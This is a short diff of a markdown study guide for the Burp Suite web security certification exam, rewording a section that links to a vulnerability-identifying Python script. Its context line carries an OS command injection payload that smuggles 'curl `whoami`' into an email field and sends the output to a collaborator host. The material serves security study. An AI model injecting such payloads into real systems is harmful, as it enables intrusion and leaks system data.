@@ -2436,9 +2436,9 @@ email=carlos@exam.net||curl+`whoami`.COLLABORATOR.net||
 
 ## Python Scripts 
 
->This python script I am building to help me in the exam to quickly ***identify*** possible indicators of know vulnerabilities.
+>Python script to ***[identify](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/python/identify)*** vulnerabilities in the exam and provide indicators of exploits.  
 
-
+[Python Script to ***identify*** possible vulnerabilities in headers, cookies or the response body](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/python/identify)  
 
 [Lab Automated Python Scripts](python/README.md)  
 
